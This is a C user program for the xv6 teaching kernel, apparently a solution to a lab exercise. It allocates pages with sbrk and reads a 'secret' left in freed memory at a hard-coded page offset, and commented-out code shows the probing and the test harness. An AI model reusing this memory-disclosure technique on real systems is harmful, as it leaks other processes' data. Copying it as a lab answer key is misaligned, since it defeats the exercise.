#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

char *secret="abcdefgh";

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)

  char *end = sbrk(PGSIZE*32);
  write(2,(end+16*PGSIZE)+32,8);
  exit(0);

  // probing code

  // if(argc == 2){
  //     char *end = sbrk(PGSIZE*32);
  //     for(int i = 0; i < 32; i++){
  //       if(strcmp(end+32, secret) == 0){
  //         printf("found: %dth page\n", i); // 16th page
  //         exit(0);
  //       }
  //       end += PGSIZE;
  //     }
  // }

  // int pid;
  // int fds[2];

  // if((pid = fork()) < 0) {
  //   printf("fork failed\n");
  //   exit(1);   
  // }

  // if(pid == 0) {
  //   char *newargv[] = { "secret", secret, 0 };
  //   exec(newargv[0], newargv);
  //   printf("exec %s failed\n", newargv[0]);
  //   exit(1);
  // } else {
  //   wait(0);  // wait for secret to exit
  //   if(pipe(fds) < 0) {
  //     printf("pipe failed\n");
  //     exit(1);   
  //   }
  //   if((pid = fork()) < 0) {
  //     printf("fork failed\n");
  //     exit(1);   
  //   }
  //   if(pid == 0) {
  //     close(fds[0]);
  //     close(2);
  //     dup(fds[1]);
  //     char *newargv[] = { "attack", "aaaa", 0 };
  //     exec(newargv[0], newargv);
  //     printf("exec %s failed\n", newargv[0]); 
  //     exit(1);
  //   }
  //   wait(0);
  // }

}
